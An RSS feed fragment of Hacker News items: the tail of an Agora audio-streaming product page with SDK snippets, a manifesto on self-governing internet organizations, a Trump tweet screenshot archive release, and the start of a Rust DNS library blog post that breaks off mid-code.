					<div>
				<div data-id="33ffa988" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img src="https://www.agora.io/en/wp-content/uploads/2020/10/agora-audio-stream-feature-1.jpg" title="" alt="">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="52d53b18" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="7a747e58" data-element_type="column">
			<div>
					<div>
				<section data-id="60c28eb6" data-element_type="section">
						<div>
				<div>
				
				<div data-id="15f9c848" data-element_type="column">
			<div>
					<div>
				<div data-id="47ef5495" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img src="https://www.agora.io/en/wp-content/uploads/2020/10/agora-audio-stream-feature-2.jpg" title="" alt="">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="5d201516" data-element_type="column">
			<div>
					<div>
				
				<div data-id="5e7f811b" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><h4><strong>Cross-channel co-hosts</strong></h4><p>Create a competition or co-host event with hosts from up to four channels in an audio stream, perfect for live streaming social gatherings jointly or hosting competitions between cooks, DJs, or performance artists in different virtual rooms.</p><h4><strong>Voice effects</strong></h4><p>Make streams fun and engaging with a range of voice effects. From sound mixing to sound reverb, users can change the way their voices sound to match their moods, characters they’re playing, or just satisfy a whim.</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="2e2bc52f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="7923d225" data-element_type="column">
			<div>
					<div>
				<section data-id="2e43b31c" data-element_type="section">
						<div>
				<div>
				
				<div data-id="855b0c2" data-element_type="column">
			<div>
					<div>
				
				<div data-id="caefc57" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><h4><strong>In-ear monitoring</strong></h4><p>Agora’s Real-Time Engagement Platform supports in-ear monitoring for mobile devices. Users can hear their own voices or voice effects in online KTV, live-streaming apps, and other apps where audio is important.</p><h4><strong>AI-powered noise cancellation</strong></h4><p>Using automatic echo cancellation, automatic gain control, automatic noise suppression, and an AI-powered noise cancellation algorithm, Agora’s platform adapts to variant acoustic conditions to remove ambient and distracting noises, ensuring voices come through crystal clear.</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="2a613f8" data-element_type="column">
			<div>
					<div>
				<div data-id="7d95e9b8" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img src="https://www.agora.io/en/wp-content/uploads/2020/10/agora-audio-stream-feature-3.jpg" title="" alt="">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="6bef8e08" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;animation&quot;:&quot;none&quot;}">
							
							<div>
				<div>
				<div data-id="8424a6a" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div>
							
					<div>
				
				
				<div data-id="4c61f317" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>You get all the above plus the power of <strong>Agora’s Real-Time Engagement Platform</strong></h2>		</p>
				</div>
				<div data-id="254f4139" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>With an intelligent global network, optimizations for mobile devices, over 450 APIs, cross-platform SDKs, and developer-centric building blocks, why would you choose anyone else?</p>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="6dbeff7f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="60242002" data-element_type="column">
			<div>
					<div>
				
				
				<div data-id="532ea407" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Connect to the Agora platform with only a few lines of code</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="18314236" data-element_type="section">
						
		</section>
				<section data-id="45bb8896" data-element_type="section">
						
		</section>
				<section data-id="206d80de" data-element_type="section">
						<div>
				<div>
				
				<div data-id="5b581fe1" data-element_type="column">
			<div>
					<div>
				<section data-id="32ead489" data-element_type="section">
						<div>
				<div>
				<div data-id="66ccdb81" data-element_type="column">
			<div>
					<div>
				<div data-id="2c582de4" data-element_type="widget" id="tab1-data" data-widget_type="text-editor.default">
				<div>
					<div><pre><span>import</span> <span>AgoraRtcKit</span>

<span>agoraKit</span> <span>=</span> <span>AgoraRtcEngineKit</span><span>.</span><span>sharedEngine</span><span>(withAppId</span><span>:</span> <span>AppID</span><span>,</span> <span>delegate</span><span>:</span> <span>self</span><span>)</span>
<span>agoraKit.</span><span>setupLocalVideo</span><span>(videoCanvas)</span>
<span>agoraKit.</span><span>enableVideo</span><span>()</span>
<span>agoraKit.</span><span>joinChannel</span><span>(byToken</span><span>:</span> <span>Token</span><span>,</span> <span>channelId</span><span>:</span> <span>"demoChanne1"</span><span>,</span> <span>info</span><span>:</span><span>nil</span><span>,</span> <span>uid:0)</span>
<span>agoraKit.</span><span>setupRemoteVideo</span><span>(videoCanvas)</span>
<span>agoraKit.</span><span>leaveChannel</span><span>(</span><span>nil</span><span>)</span>
</pre></div>
				</div>
				</div>
				<div data-id="18ddb674" data-element_type="widget" id="tab2-data" data-widget_type="text-editor.default">
				<div>
					<div><pre><span>import</span> <span>io.agora.rtc.RtcEngine</span><span>;</span>

<span>mRtcEngine</span> <span>=</span> <span>RtcEngine</span><span>.</span><span>create</span><span>(context, appid, eventHandler);</span>
<span>mRtcEngine</span><span>.</span><span>setupLocalVideo</span><span>(videoCanvas);</span>
<span>mRtcEngine</span><span>.</span><span>enableVideo</span><span>();</span>
<span>mRtcEngine</span><span>.</span><span>joinChannel</span><span>(token, channelName, info, uid);</span>
<span>mRtcEngine</span><span>.</span><span>setupRemoteVideo</span><span>(videoCanvas);</span>
<span>mRtcEngine</span><span>.</span><span>leaveChannel</span><span>();</span>
</pre></div>
				</div>
				</div>
				<div data-id="4984d7fb" data-element_type="widget" id="tab3-data" data-widget_type="text-editor.default">
				<div>
					<div><pre><span>import</span> <span>AgoraRTC</span> <span>from</span> <span>'agora-rtc-sdk'</span><span>;</span>

<span>let</span> <span>client</span> <span>=</span> <span>AgoraRTC</span><span>.</span><span>createClient</span><span>(config);  client.</span><span>init</span><span>(appid);</span>
<span>let</span> <span>localStream</span> <span>=</span> <span>AgoraRTC</span><span>.</span><span>createStream</span><span>(streamSpec)</span>
<span>localStream.</span><span>init</span><span>();  localStream.</span><span>play</span><span>(elementID);</span>
<span>client.</span><span>join</span><span>(token, channel, uid);</span>
<span>remoteStream.</span><span>play</span><span>(</span><span>"elementID"</span><span>);</span>
<span>client.</span><span>leave</span><span>();</span>
</pre></div>
				</div>
				</div>
				<div data-id="5d8cd1c4" data-element_type="widget" id="tab4-data" data-widget_type="text-editor.default">
				<div>
					<div><pre><span>using</span> <span>agora_gaming_rtc</span><span>;</span>

<span>IRtcEngine</span> <span>mRtcEngine</span> <span>=</span> <span>IRtcEngine</span><span>.</span><span>getEngine</span><span>(</span><span>appId</span><span>);</span>
<span>mRtcEngine</span><span>.</span><span>EnableVideo</span><span>();</span>
<span>mmRtcEngine</span><span>.</span><span>EnableVideoObserver</span><span>();</span>
<span>mmRtcEngine</span><span>.</span><span>JoinChannel</span><span>(</span><span>channel</span><span>,</span> <span>null</span><span>,</span> <span>0</span><span>);</span>
<span>VideoSurface</span> <span>remoteVideoSurface</span> <span>=</span> <span>go</span><span>.</span><span>AddComponent</span><span>&lt;</span><span>VideoSurface</span><span>&gt;</span> <span>();</span>
<span>mmRtcEngine</span><span>.</span><span>LeaveChannel</span><span>();</span>
<span>mmRtcEngine</span><span>.</span><span>DisableVideoObserver</span><span>();</span>
</pre></div>
				</div>
				</div>
				<div data-id="2521d464" data-element_type="widget" id="tab5-data" data-widget_type="text-editor.default">
				<div>
					<div><pre><span>import</span> <span>AgoraRtcEngine</span> <span>from</span> <span>'agora-electron-sdk'</span><span>;</span>

<span>RtcEngine</span><span>.</span><span>initialize</span><span>(appid);</span>
<span>RtcEngine</span><span>.</span><span>setupLocalVideo</span><span>(element);</span>
<span>RtcEngine</span><span>.</span><span>enableVideo</span><span>()</span>
<span>RtcEngine</span><span>.</span><span>joinChannel</span><span>(token, channel, info, uid);</span>
<span>RtcEngine</span><span>.</span><span>setupRemoveVideo</span><span>(uid, view, info, channel);</span>
<span>RtcEngine</span><span>.</span><span>leaveChannel</span><span>()</span>
</pre></div>
				</div>
				</div>
				<div data-id="2a96e836" data-element_type="widget" id="tab6-data" data-widget_type="text-editor.default">
				<div>
					<div><pre><span>#include</span> <span>"IAgoraRtcEngine.h"</span>

<span>m_lpAgoraEngine</span> <span>=</span> <span>(</span><span>IRtcEngine</span> <span>*</span><span>)</span><span>createAgoraRtcEngine</span><span>();</span>
<span>m_lpAgoraObject</span><span>-&gt;</span><span>GetEngine</span><span>()</span><span>-&gt;</span><span>setupLocalVideo</span><span>(vc);</span>
<span>m_lpAgoraObject</span><span>-&gt;</span><span>GetEngine</span><span>()</span><span>-&gt;</span><span>enableVideo</span><span>();</span>
<span>int</span> <span>nRet</span> <span>=</span> <span>m_lpAgoraEngine</span><span>-&gt;</span><span>joinChannel</span><span>(token, channelName,</span> <span>NULL</span><span>, nUID);</span>
<span>m_lpAgoraObject</span><span>-&gt;</span><span>GetEngine</span><span>()</span><span>-&gt;</span><span>setupRemoteVideo</span><span>(vc);</span>
<span>int</span> <span>nRet</span> <span>=</span> <span>m_lpAgoraEngine</span><span>-&gt;</span><span>leaveChannel</span><span>();</span>
</pre></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
				<section data-id="abcde5d" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;animation&quot;:&quot;none&quot;}">
							
							<div>
				<div>
				<div data-id="6b090349" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div>
							
					<div>
				<div data-id="1e14e95b" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Pricing that Scales with your Business</h2>		</p>
				</div>
				<div data-id="1f112c9c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Get <strong>10,000</strong> mins <strong>FREE</strong> per month</p>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="e29c72b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;animation&quot;:&quot;none&quot;}">
							
							<div>
				<div>
				<div data-id="264ab437" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div>
							
					<div>
				<section data-id="7915d661" data-element_type="section">
						<div>
				<div>
				<div data-id="6837263e" data-element_type="column">
			<div>
					<div>
				
				<div data-id="2dd66d93" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Let’s <strong>start</strong> working together</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
				<div data-id="57480df5" data-element_type="column">
			<div>
					<div>
				
				<div data-id="3f0074a5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Whether you have questions about Agora technology, development, pricing or partnerships, we’re here to help.</p>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				
				<div data-id="3a9ce7e" data-element_type="column">
			<div>
					<div>
				
				<div data-id="5b165926" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>With 10,000 free minutes each month, you don’t pay until your business starts to scale. No credit card required.</p>
				</div>
				</div>
				</div></div></div></div></div></section></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.agora.io/en/products/live-interactive-audio-streaming/">https://www.agora.io/en/products/live-interactive-audio-streaming/</a></em></p>]]>
            </description>
            <link>https://www.agora.io/en/products/live-interactive-audio-streaming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25694051</guid>
            <pubDate>Sat, 09 Jan 2021 01:04:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Self-Governing Internet Organizations Manifest]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25693449">thread link</a>) | @neiman
<br/>
January 8, 2021 | https://almonit.club/blog/2020-12-07/self-governing_internet_organizations_part_I.html | <a href="https://web.archive.org/web/*/https://almonit.club/blog/2020-12-07/self-governing_internet_organizations_part_I.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  <p><span>Written by</span>
    
        Neiman
    

    
      <br>
      <span>on&nbsp;</span><time datetime="2020-12-07 00:00:33 +0100">December 07, 2020</time>
    
  </p>

  
  

  <p>If there was any doubt before, COVID-19 made it clear: <em>digital life is real life</em>.  Our lives exist on the Internet no less so than on the streets. But while we control the streets (via the state), the Internet is made of centralized platforms controlled by commercial corporates.</p>

<p>If digital life is real life, with the internet acting as an integral part of our social structure, we should control it rather than be controlled by it.</p>

<p>This article presents self-governing Internet organizations (SGOs): digital organizations that are owned and governed by their users. We suggest SGOs as an alternative to commercial control of the internet.</p>

<p>SGOs are an idea that brings democratic states forward into the digital age. Their technical implementation has been made possible by developments in the blockchain movement over the last decade.</p>

<p>The unique value of SGOs is “power to the people of the Internet”. No more power to rich owners, just let the people of the Internet rule themselves.</p>

<p>Part I lays the philosophical foundations for SGOs, while Part II would discuss the technical implementation.</p>

<h2 id="challenges">Challenges</h2>
<p>First, to clarify, “governing” means in all aspects of the organization. From moderating content to monetizing its products. Users own these SGOs organizations in all possible meanings.</p>

<p>For example, cooperatives are SGOs, but they are normally governed by the workers rather than their users (or customers). Democratic states are another example of SGOs (since they are governed by their citizens), but they are not digital.</p>

<p>Those two unique properties, being governed by the users and being digital, make it difficult to create SGOs.</p>

<p>It is difficult to create an organization governed by its users, because who <em>exactly</em> are those users? Is anyone who used a project of the organization once is a “user” (with voting rights)? Are users only paying customers? Or maybe “users” is a more broad term, that includes also developers, maintainers, managers, and investors?</p>

<p>It is difficult to create self-governing organizations, since how can they be self-governed without using a third party? also, if a third party is involved, is it still governed by the users or rather by this party? It’s easier for a group of people to manage a self-governing organization in real life, but a digital one is challenging.</p>

<p>There’s no algorithm for designing an SGO. It is, after all, a human community, and each human community should be designed independently, to fit the unique spirit of its human members.</p>

<p>Listed below are general principles SGOs should follow in order to be digital self-governing organizations. Part II of this article would describe the technical tools to implement SGOs that follow these principles.</p>

<h2 id="the-ten-principles-of-self-governing-internet-organizations">The ten principles of self-governing Internet organizations</h2>
<p>The “Rochdale Society of Equitable Pioneers”, an early cooperative, opened its store on 21 December 1844. The 28 founders were skilled workers, pushed into poverty by the industrial revolution.</p>

<p>The Rochdale society was not the first cooperative in history. There were a few hundred failed attempts in creating cooperatives before that. But it was the first cooperative that succeeded. The Rochdale society created “Rochdale Principles” based on the previous failed attempts. Following those principles, they managed to create a successful cooperative.</p>

<p>Inspired by the “Rochdale Principles”, we create a set of principles for SGOs. Our principles are based on many examples of Internet platforms and blockchain organizations from the 21st century. Principles 3, 4, 6, and 7 are adapted from Rochdale principles themselves.</p>

<ol>
  <li>
    <p><strong>Users first/prioritizing users</strong>. the SGO’s main priority is benefiting its users. All decisions are taken under the constraint that they either benefit or otherwise do not harm, the users.</p>

    <p><em>Two assumptions underlie this principle</em>:</p>
    <ul>
      <li><em>An organization with enough users has myriad monetizing opportunities, meaning there is no bankruptcy risk in prioritizing users.</em></li>
      <li><em>There would be no need for SGOs if commercial Internet organizations would prioritize their users first.</em>
 <br>&nbsp;</li>
    </ul>
  </li>
  <li>
    <p><strong>Users are members</strong>. Members of an SGO are its own users. If further non-users members exist they should come from all parties of interest in the organization, e.g., contributors, investors, advertisers, etc.</p>

    <p><em>This principle differentiates SGOs from worker cooperatives (where only contributors are members) and consumers’ cooperatives (where only users are members).</em></p>
  </li>
  <li>
    <p><strong>Voluntary and open membership</strong>. SGOs are voluntary organizations, open to all persons able to use their services and willing to accept the responsibilities of membership, without nationality, geographically, gender, social, racial, political, or religious discrimination.</p>
  </li>
  <li>
    <p><strong>Democratic member control</strong>. SGOs are democratic organizations controlled by their members, who actively participate in setting their policies and making decisions.</p>
  </li>
  <li>
    <p><strong>Members equality: one member one vote</strong>. All members have equal influence, without nationality, geographically, gender, social, racial, political, or religious discrimination. One full member gets one vote.</p>

    <p>However, due to the dynamic nature of the internet, it may take time to become a full member (with an equal vote). Partial members have a partial vote, but it must be that each partial member becomes a full member given enough time has elapsed (the exact period of time may vary from one member to another, but must be pre-defined when the member joins).</p>
  </li>
  <li>
    <p><strong>Autonomy and independence</strong>. SGOs are autonomous organizations controlled by their members. If they enter into agreements with other organizations, including governments, or raise capital from external sources, they do so on terms that ensure democratic control by their members and maintain their autonomy.</p>
  </li>
  <li>
    <p><strong>Cooperation among SGOs</strong>. SGOs serve their members most effectively and strengthen the self-governing movement by working together to create bigger self-governing digital social structures.</p>
  </li>
  <li>
    <p><strong>Concern for the internet</strong>. Regardless of the SGO’s main activity, it must always take steps to ensure the openness of the Internet as mentioned in <a href="https://www.mozilla.org/en-US/about/manifesto/">the Mozilla manifesto</a></p>
  </li>
  <li>
    <p><strong>self-sustainable</strong>. An SGO must thrive to be self-sustainable, both in a financial manner and in its dependencies on other services. If the SGO uses a service it must ensure that the service is fair to the community, and can be changed in case of problem arises with the entity supplying it.</p>
  </li>
  <li>
    <p><strong>compensating individual innovation</strong>. An SGO must promote users’ innovation, including users adding features and content to the SGO projects. Users may monetize any feature they add without a-priory permission from the organization and may enjoy the majority of the revenues received from these features (though at least part of it must be given to the SGO if the revenue is high enough)</p>

    <p><em>This last complex principle is an effort to bring the benefits of the capital philosophy to SGOs, with a light version of the tax.</em></p>
  </li>
</ol>

<h2 id="call-for-action">Call for action</h2>
<p>Almonit is currently working on Alpress, a self-governing publication platform following the principles described in this article.</p>

<p>Follow us <a href="https://twitter.com/GoAlmonit">on Twitter</a>, join <a href="https://t.co/Z79kgx8noD?amp=1">our Telegram group</a> or drop us an email (contact@almonit.club) to get involved in the project.</p>

<h2 id="acknowledgement">Acknowledgement</h2>
<p>Thanks to Krzysztof Lewosz, Muhammed Tanrıkulu, Eylon Aviv, and Craig Sailor for participating in the preparation of this article.</p>

</div>



    </div></div>]]>
            </description>
            <link>https://almonit.club/blog/2020-12-07/self-governing_internet_organizations_part_I.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25693449</guid>
            <pubDate>Sat, 09 Jan 2021 00:35:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Archive of 43k+ Donald Trump Twitter Screenshots]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25693054">thread link</a>) | @soheilpro
<br/>
January 8, 2021 | https://pikaso.me/blog/donald-trump-twitter-archive | <a href="https://web.archive.org/web/*/https://pikaso.me/blog/donald-trump-twitter-archive">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <div>


    <section>
      <p>
        <h2>Donald Trump Twitter Screenshot Archive</h2>
      </p>
      
        
      

      <div><p>Donald Trump loves to tweet and everyone knows that.
Twitter is his favorite medium to express his ideas and to communicate with the world.
He has been an active Twitter user since 2009. Much longer than many other world leaders.</p>
<p>Last month (May 2020) he tweeted 845 times â€” that's 28 tweets per day on average!</p>
<center>
  <a href="https://twitter.com/realDonaldTrump/status/491324429184823296"><img src="https://pikaso.me/blog/files/pikaso.me-realDonaldTrump-20140721_205046-491324429184823296.png" alt="Trump Tweet" width="500" height="244"></a>
</center>
<p>A while ago we received a request from one of our users who was looking for a way to screenshot all Donald Trump tweets.
We realized that's a good opportunity to put <a href="https://pikaso.me/">Pikaso</a> into test and see if it can perform such a task without any problems.
It went smoothly and there was only an issue with one of his tweets which included a deleted image.</p>
<p>Today, we are releasing the resulting files to the public.
This archive contains screenshots of 43,475 Donald Trump tweets from May 2009 to May 2020.
Whether you are pro- or anti- Trump, this is an important part of Internet history that we believe should be preserved.</p>
<h3 id="download">Download</h3>
<p>The Donald Trump Twitter Screenshot Archive can be downloaded through the following links:</p>
<ul>
<li><a href="https://pikaso.me/go/trump-twitter-archive-v1.zip">trump_twitter_archive_v1.zip</a> (Direct download, 2.6 GB)</li>
<li><a href="https://pikaso.me/go/trump-twitter-archive-v1.torrent">trump_twitter_archive_v1.torrent</a> (Torrent download, 28.2 KB)</li>
</ul>
<h3 id="howthiswasmade">How This Was Made?</h3>
<p>To create this archive, we first extracted all tweet ids from the realDonaldTrump.csv file that was provided to us.
That file only contained Donald Trump tweets up to March 29, 2020. To get the later tweets, we used <a href="http://trumptwitterarchive.com/">trumptwitterarchive.com</a>.</p>
<p>We then used the <a href="https://pikaso.me/api">Pikaso API</a> to screenshot each individual tweet.</p>
<h3 id="updates">Updates</h3>
<p>We have no plans to keep this archive up to date after the initial release.
However, if you are interested in doing so, you can use <a href="https://pikaso.me/">Pikaso</a>.
You can even <a href="https://pikaso.me/automate">automate</a> it so that each time he tweets, an automatic screenshot is taken.</p>
<h3 id="credit">Credit</h3>
<p>All the tweets are copyright https://twitter.com/realdonaldtrump.<br>
All the media embedded in tweets are copyright their respective owners.<br>
Original tweets data provided by <a href="https://twitter.com/twentysox">@twentysox</a>.</p>
<h3 id="copyrightlicense">Copyright &amp; License</h3>
<p>Copyright © 2020 https://pikaso.me.<br>
This work by https://pikaso.me is licensed under <a href="https://creativecommons.org/licenses/by/4.0">CC BY 4.0</a>.</p>
<h3 id="contact">Contact</h3>
<p>If you have any feedback or questions regarding this work, please <a href="https://pikaso.me/contact">contact us</a>.</p></div>
    </section>

    

    
      <section>
        <h2>More from the Blog</h2>

        
      </section>
    

      </div>
  
</div></div>]]>
            </description>
            <link>https://pikaso.me/blog/donald-trump-twitter-archive</link>
            <guid isPermaLink="false">hacker-news-small-sites-25693054</guid>
            <pubDate>Sat, 09 Jan 2021 00:14:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nonymous and bore: DNS toys for Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25692447">thread link</a>) | @fanf2
<br/>
January 8, 2021 | https://www.azabani.com/2021/01/03/nonymous-bore.html | <a href="https://web.archive.org/web/*/https://www.azabani.com/2021/01/03/nonymous-bore.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>I’ve been writing a DNS implementation in Rust.
This project started out as a vehicle for learning Rust, but the more I learned, the more challenging goals I was able to set, to the point where I can see its potential to become useful in its own right.
Here’s a post about what I’ve learned so far while writing <a href="https://crates.io/crates/nonymous">nonymous</a>, an embedded-friendly DNS library with <code>#![no_std]</code> and no-alloc support, and <a href="https://crates.io/crates/bore">bore(1)</a>, a CLI tool for sending DNS queries.</p><p>Rust already has <a href="https://github.com/bluejekyll/trust-dns">a mature DNS implementation</a> that I’ve heard wonderful things about, and there’s a <em>long</em> way to go before <a href="https://crates.io/crates/nonymous">nonymous</a> approaches anything resembling feature-complete or production-ready.
But <a href="https://crates.io/crates/bore">bore(1)</a> is useful enough that I actually reach for it in 90% of the situations I would have previously used dig(1)…</p><p>…and some situations that the incumbent struggles with, like dumping, replaying, and debugging messages.</p><p>DNS is a distributed database that stores information in a hierarchy of names.
The most familiar example of these is IP addresses (the information) and hostnames (the names).
This is how your browser knows to contact 107.191.57.160 when you go to <a href="https://opacus.daz.cat/">opacus.daz.cat</a>.</p><p>Let’s explore the challenges behind the first two.</p><div>

  <!-- git log --reverse --abbrev=13 --pretty=tformat:'<div class="local-commit local-commit-none"><a href="https://bitbucket.org/delan/nonymous/commits/%H"><code>%h</code></a><img src="/images/badapple-commit-none.svg"></div>%n%ad    %s%n' -->

  <!-- <div class="local-commit"><a href="https://bitbucket.org/delan/nonymous/commits/c223c4eef1971f8eefdb3fea996536677c39f396"><code>c223c4eef1971</code></a><img src="/images/badapple-commit-dot.svg"></div> -->

  <div id="hg-v0">

    <!-- FIXME jekyll option? -->
    <h2 id="naïve-decoders">Naïve decoders</h2>

    <p>My initial approach was based around a trait that would describe a type that we can instantiate from something we can <a href="https://doc.rust-lang.org/std/io/trait.Read.html"><code>Read</code></a>.
After all, the network is just like a stream that you pipe into your program… right?</p>

    <figure>
      <div>
        <div><div><pre><code><span>pub</span> <span>trait</span> <span>Decode</span><span>&lt;</span><span>T</span><span>:</span> <span>Read</span><span>,</span> <span>E</span><span>&gt;</span><span>:</span> <span>'static</span> <span>+</span> <span>Sized</span> <span>{</span>
    <span>fn</span> <span>decode</span><span>(</span><span>source</span><span>:</span> <span>&amp;</span><span>mut</span> <span>T</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Self</span><span>,</span> <span>E</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div>        </div>
      </div>
    </figure>

    <p>So if we defined a <code>Message</code> type that represents a message, we could then define how to parse one out of an octet stream.</p>

    <figure>
      <div>
        <div><div><pre><code><span>/// ```rust</span>
<span>/// let mut source = &amp;b"\x13\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"[..];</span>
<span>/// let message = Message::decode(&amp;mut source)?;</span>
<span>/// ```</span>
<span>pub</span> <span>struct</span> <span>Message</span> <span>{</span>
    <span>header</span><span>:</span> <span>Header</span><span>,</span>
    <span>// ...</span>
<span>}</span>

<span>pub</span> <span>struct</span> <span>Header</span> <span>{</span>
    <span>id</span><span>:</span> <span>u16</span><span>,</span>
    <span>qr</span><span>:</span> <span>bool</span><span>,</span>
    <span>opcode</span><span>:</span> <span>u8</span><span>,</span>
    <span>aa</span><span>:</span> <span>bool</span><span>,</span>
    <span>// ...</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Read</span><span>&gt;</span> <span>Decode</span><span>&lt;</span><span>T</span><span>,</span> <span>MessageError</span><span>&gt;</span> <span>for</span> <span>Message</span> <span>{</span>
    <span>fn</span> <span>decode</span><span>(</span><span>source</span><span>:</span> <span>&amp;</span><span>mut</span> <span>T</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Self</span><span>,</span> <span>MessageError</span><span>&gt;</span> <span>{</span>
        <span>let</span> <span>header</span> <span>=</span> <span>Header</span><span>::</span><span>decode</span><span>(</span><span>source</span><span>)</span><span>?</span><span>;</span>
        <span>// ...</span>

        <span>Ok</span><span>(</span><span>Self</span> <span>{</span> <span>header</span><span>,</span> <span>/* ... */</span> <span>})</span>
    <span>}</span>
<span>}</span>
</code></pre></div>        </div>
      </div>
    </figure>

    <p>This approach has a few problems.
The most obvious one is that <a href="https://doc.rust-lang.org/std/io/trait.Read.html"><code>Read</code></a> isn’t available in <code>#![no_std]</code>, but this wouldn’t be too hard to work around with a shim trait.</p>

    <p>A deeper problem is that parsing DNS messages in one pass without random access is incompatible with <a href="https://tools.ietf.org/html/rfc1035#section-4.1.4"><strong>message compression</strong></a>, which allows names <a href="https://tools.ietf.org/html/rfc3597#section-4">in some places</a> to “point” to labels somewhere else in the message.
For example, this message represents <code>a.root-servers.net.</code> in full, then reuses part of that with <code>b.</code> followed by “go to 1Eh for the rest”:</p>

    <figure>
<div><picture>
    <source srcset="https://www.azabani.com/images/nonymous-bore-compression@1x.png 1x, https://www.azabani.com/images/nonymous-bore-compression@2x.png 2x">
    <img src="https://www.azabani.com/images/nonymous-bore-compression@2x.png">
</picture></div>
</figure>

    <p>The solution I reached for here was, in retrospect, very inelegant: a pair of <code>Read</code> adapters that allow the caller to read behind or ahead (respectively) of the current position in the underlying stream.</p>

    <figure>
      <div>
        <div><div><pre><code><span>pub</span> <span>struct</span> <span>Rewind</span><span>&lt;</span><span>I</span><span>:</span> <span>Read</span><span>&gt;</span> <span>{</span>
    <span>inner</span><span>:</span> <span>I</span><span>,</span>
    <span>memory</span><span>:</span> <span>Vec</span><span>&lt;</span><span>u8</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>pub</span> <span>struct</span> <span>Peek</span><span>&lt;</span><span>I</span><span>:</span> <span>Read</span><span>&gt;</span> <span>{</span>
    <span>inner</span><span>:</span> <span>I</span><span>,</span>
    <span>future</span><span>:</span> <span>Vec</span><span>&lt;</span><span>u8</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>I</span><span>:</span> <span>Read</span><span>&gt;</span> <span>Read</span> <span>for</span> <span>Rewind</span><span>&lt;</span><span>I</span><span>&gt;</span> <span>{</span> <span>/* ... */</span> <span>}</span>
<span>impl</span><span>&lt;</span><span>I</span><span>:</span> <span>Read</span><span>&gt;</span> <span>Read</span> <span>for</span> <span>Peek</span><span>&lt;</span><span>I</span><span>&gt;</span> <span>{</span> <span>/* ... */</span> <span>}</span>

<span>impl</span><span>&lt;</span><span>I</span><span>:</span> <span>Read</span><span>&gt;</span> <span>Rewind</span><span>&lt;</span><span>I</span><span>&gt;</span> <span>{</span>
    <span>pub</span> <span>fn</span> <span>rewind</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>position</span><span>:</span> <span>usize</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>Peek</span><span>&lt;</span><span>Cursor</span><span>&lt;</span><span>[</span><span>u8</span><span>]</span><span>&gt;&gt;&gt;</span> <span>{</span> <span>/* ... */</span> <span>}</span>
<span>}</span>

